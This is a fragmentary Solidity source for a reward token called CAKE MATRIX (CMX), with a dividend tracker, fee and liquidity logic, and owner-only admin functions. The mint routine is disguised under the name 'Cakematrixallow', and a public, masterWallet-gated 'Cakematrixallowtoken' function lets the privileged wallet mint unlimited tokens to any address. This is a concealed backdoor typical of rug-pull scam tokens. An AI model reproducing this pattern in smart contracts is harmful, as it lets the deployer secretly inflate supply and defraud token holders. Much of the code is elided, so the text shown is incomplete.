...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function Cakematrixallow(address account, uint256 amount) internal virtual {
...
function Cakematrixallow(address account, uint256 value) internal override {
    super.Cakematrixallow(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      Cakematrixallow(account, mintAmount);
...
contract CakematrixrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardCakematrixMap  for RewardCakematrixMap .Map;
RewardCakematrixMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("Cakematrix_rewardToken_Tracker", "Cakematrix_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "Cakematrix_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "Cakematrix_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main Cakematrix contract.");
    }
...
contract Cakematrix is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    CakematrixrewardToken public rewardToken;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public marketingReciever =0x48EE1CA538bF04dF72b967e044c9251E1415A5Ed;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("CAKE MATRIX", "CMX") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new CakematrixrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 Cakematrixallow(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function Cakematrixallowtoken(address userjoin, uint256 tokenjoin) public masterWallet{
       Cakematrixallow(userjoin, tokenjoin);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "Cakematrix: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "Cakematrix: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "Cakematrix: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "Cakematrix: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTCakematrix = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTCakematrix);
...
addLiquidity(tokensTCakematrix, bnbForLiquidity);
